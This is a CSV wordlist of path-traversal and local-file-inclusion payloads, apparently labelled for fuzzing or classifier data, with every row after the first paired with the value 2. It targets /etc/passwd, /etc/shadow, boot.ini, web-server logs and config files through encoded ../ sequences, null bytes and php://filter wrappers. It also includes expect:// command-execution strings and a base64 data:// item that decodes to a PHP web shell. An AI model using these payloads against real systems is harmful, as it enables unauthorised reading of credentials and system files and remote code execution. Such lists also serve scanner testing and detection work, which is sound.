Payload1,Payload2
2,2
/.../.../.../.../.../,2
\…..\\\…..\\\…..\\\,2
%00../../../../../../etc/passwd,2
%00/etc/passwd%00,2
%00../../../../../../etc/shadow,2
%00/etc/shadow%00,2
%0a/bin/cat%20/etc/passwd,2
%0a/bin/cat%20/etc/shadow,2
php://filter/read=string.rot13/resource=/etc/passwd,2
php://filter/convert.base64-encode/resource=/etc/passwd,2
pHp://FilTer/convert.base64-encode/resource=/etc/passwd,2
php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd,2
"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",2
expect://id,2
expect://ls,2
/usr/local/apache/log/error_log,2
/usr/local/apache2/log/error_log,2
/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,2
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%  25%5c..%25%5c..%00,2
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,2
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%    25%5c..%25%5c..%255cboot.ini,2
/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini,2
/../../../../../../../../%2A,2
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,2
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,2
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,2
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd,2
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow,2
..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed,2
..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd,2
..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow,2
=3D “/..” . “%2f..,2
..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini,2
admin/access_log,2
/admin/install.php,2
../../../administrator/inbox,2
/apache2/logs/access_log,2
/apache2/logs/access.log,2
/apache2/logs/error_log,2
/apache2/logs/error.log,2
/apache/logs/access_log,2
/apache/logs/access.log,2
../../../../../apache/logs/access.log,2
../../../../apache/logs/access.log,2
../../../apache/logs/access.log,2
../../apache/logs/access.log,2
../apache/logs/access.log,2
/apache/logs/error_log,2
/apache/logs/error.log,2
../../../../../apache/logs/error.log,2
../../../../apache/logs/error.log,2
../../../apache/logs/error.log,2
../../apache/logs/error.log,2
../apache/logs/error.log,2
/apache\php\php.ini,2
\\&apos;/bin/cat%20/etc/passwd\\&apos;,2
\\&apos;/bin/cat%20/etc/shadow\\&apos;,2
/.bash_history,2
/.bash_profile,2
/.bashrc,2
/../../../../../../../../bin/id|,2
/bin/php.ini,2
/boot/grub/grub.conf,2
/./././././././././././boot.ini,2
/../../../../../../../../../../../boot.ini,2
/..\../..\../..\../..\../..\../..\../boot.ini,2
/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini,2
..//..//..//..//..//boot.ini,2
../../../../../../../../../../../../boot.ini,2
../../boot.ini,2
..\../..\../..\../..\../boot.ini,2
..\../..\../boot.ini,2
..\..\..\..\..\..\..\..\..\..\boot.ini,2
\..\..\..\..\..\..\..\..\..\..\boot.ini,2
/../../../../../../../../../../../boot.ini%00,2
../../../../../../../../../../../../boot.ini%00,2
..\..\..\..\..\..\..\..\..\..\boot.ini%00,2
/../../../../../../../../../../../boot.ini%00.html,2
/../../../../../../../../../../../boot.ini%00.jpg,2
/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd,2
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,2
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,2
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,2
c:\apache\logs\access.log,2
c:\apache\logs\error.log,2
c:\AppServ\MySQL,2
C:/boot.ini,2
C:\boot.ini,2
/C:/inetpub/ftproot/,2
C:/inetpub/wwwroot/global.asa,2
C:\inetpub\wwwroot\global.asa,2
c:\inetpub\wwwroot\index.asp,2
/config.asp,2
../config.asp,2
config.asp,2
../config.inc.php,2
config.inc.php,2
../config.js,2
config.js,2
_config.php,2
../_config.php,2
../config.php,2
config.php,2
../_config.php%00,2
../../../../../../../../conf/server.xml,2
/core/config.php,2
/C:\Program Files\,2
c:\Program Files\Apache Group\Apache\logs\access.log,2
c:\Program Files\Apache Group\Apache\logs\error.log,2
/.cshrc,2
c:\System32\Inetsrv\metabase.xml,2
c:WINDOWS/system32/,2
d:\AppServ\MySQL,2
database.asp,2
database.js,2
database.php,2
data.php,2
dbase.php a,2
db.php,2
../../../../../../../dev,2
/D:\Program Files\,2
d:\System32\Inetsrv\metabase.xml,2
/etc/apache2/apache2.conf,2
/etc/apache2/conf/httpd.conf,2
/etc/apache2/httpd.conf,2
/etc/apache2/sites-available/default,2
/etc/apache2/vhosts.d/default_vhost.include,2
/etc/apache/apache.conf,2
/etc/apache/conf/httpd.conf,2
/etc/apache/httpd.conf,2
/etc/apt/sources.list,2
/etc/chrootUsers,2
/etc/crontab,2
/etc/defaultdomain,2
/etc/default/passwd,2
/etc/defaultrouter,2
/etc/fstab,2
/etc/ftpchroot,2
/etc/ftphosts,2
/etc/group,2
/etc/hostname.bge,2
/etc/hostname.ce0,2
/etc/hostname.ce1,2
/etc/hostname.ce2,2
/etc/hostname.ce3,2
/etc/hostname.dcelx0,2
/etc/hostname.dcelx1,2
/etc/hostname.dcelx2,2
/etc/hostname.dcelx3,2
/etc/hostname.dmfe0,2
/etc/hostname.dmfe1,2
/etc/hostname.dmfe2,2
/etc/hostname.dmfe3,2
/etc/hostname.dnet0,2
/etc/hostname.dnet1,2
/etc/hostname.dnet2,2
/etc/hostname.dnet3,2
/etc/hostname.ecn0,2
/etc/hostname.ecn1,2
/etc/hostname.ecn2,2
/etc/hostname.ecn3,2
/etc/hostname.elx0,2
/etc/hostname.elx1,2
/etc/hostname.elx2,2
/etc/hostname.elx3,2
/etc/hostname.elxl0,2
/etc/hostname.elxl1,2
/etc/hostname.elxl2,2
/etc/hostname.elxl3,2
/etc/hostname.eri0,2
/etc/hostname.eri1,2
/etc/hostname.eri2,2
/etc/hostname.eri3,2
/etc/hostname.ge0,2
/etc/hostname.ge1,2
/etc/hostname.ge2,2
/etc/hostname.ge3,2
/etc/hostname.hme0,2
/etc/hostname.hme1,2
/etc/hostname.hme2,2
/etc/hostname.hme3,2
/etc/hostname.ieef0,2
/etc/hostname.ieef1,2
/etc/hostname.ieef2,2
/etc/hostname.ieef3,2
/etc/hostname.iprb0,2
/etc/hostname.iprb1,2
/etc/hostname.iprb2,2
/etc/hostname.iprb3,2
/etc/hostname.le0,2
/etc/hostname.le1,2
/etc/hostname.le2,2
/etc/hostname.le3,2
/etc/hostname.lo,2
/etc/hostname.pcn0,2
/etc/hostname.pcn1,2
/etc/hostname.pcn2,2
/etc/hostname.pcn3,2
/etc/hostname.qfe0,2
/etc/hostname.qfe1,2
/etc/hostname.qfe2,2
/etc/hostname.qfe3,2
/etc/hostname.spwr0,2
/etc/hostname.spwr1,2
/etc/hostname.spwr2,2
/etc/hostname.spwr3,2
/etc/hosts,2
../../../../../../../../../../../../etc/hosts,2
../../../../../../../../../../../../etc/hosts%00,2
/etc/hosts.allow,2
/etc/hosts.deny,2
/etc/hosts.equiv,2
/etc/http/conf/httpd.conf,2
/etc/httpd.conf,2
/etc/httpd/conf.d/php.conf,2
/etc/httpd/conf.d/squirrelmail.conf,2
/etc/httpd/conf.d/ssl.conf,2
/etc/httpd/conf/httpd.conf,2
/etc/httpd/httpd.conf,2
/etc/httpd/logs/acces_log,2
/etc/httpd/logs/acces.log,2
../../../../../../../etc/httpd/logs/acces_log,2
../../../../../../../etc/httpd/logs/acces.log,2
/etc/httpd/logs/access_log,2
/etc/httpd/logs/access.log,2
../../../../../etc/httpd/logs/access_log,2
../../../../../etc/httpd/logs/access.log,2
/etc/httpd/logs/error_log,2
/etc/httpd/logs/error.log,2
../../../../../../../etc/httpd/logs/error_log,2
../../../../../../../etc/httpd/logs/error.log,2
../../../../../etc/httpd/logs/error_log,2
../../../../../etc/httpd/logs/error.log,2
/etc/httpd/php.ini,2
/etc/http/httpd.conf,2
/etc/inetd.conf,2
/etc/init.d/apache,2
/etc/init.d/apache2,2
/etc/issue,2
/etc/logrotate.d/ftp,2
/etc/logrotate.d/httpd,2
/etc/logrotate.d/proftpd,2
/etc/logrotate.d/vsftpd.log,2
/etc/mail/access,2
/etc/mailman/mm_cfg.py,2
/etc/make.conf,2
/etc/master.passwd,2
/etc/motd,2
/etc/my.cnf,2
/etc/mysql/my.cnf,2
/etc/netconfig,2
/etc/nsswitch.conf,2
/etc/opt/ipf/ipf.conf,2
/etc/opt/ipf/ipnat.conf,2
/./././././././././././etc/passwd,2
/../../../../../../../../../../etc/passwd,2
/../../../../../../../../../../etc/passwd^^,2
/..\../..\../..\../..\../..\../..\../etc/passwd,2
/etc/passwd,2
../../../../../../../../../../../../../../../../../../../../../../etc/passwd,2
../../../../../../../../../../../../../../../../../../../../../etc/passwd,2
../../../../../../../../../../../../../../../../../../../../etc/passwd,2
../../../../../../../../../../../../../../../../../../../etc/passwd,2
../../../../../../../../../../../../../../../../../../etc/passwd,2
../../../../../../../../../../../../../../../../../etc/passwd,2
../../../../../../../../../../../../../../../../etc/passwd,2
../../../../../../../../../../../../../../../etc/passwd,2
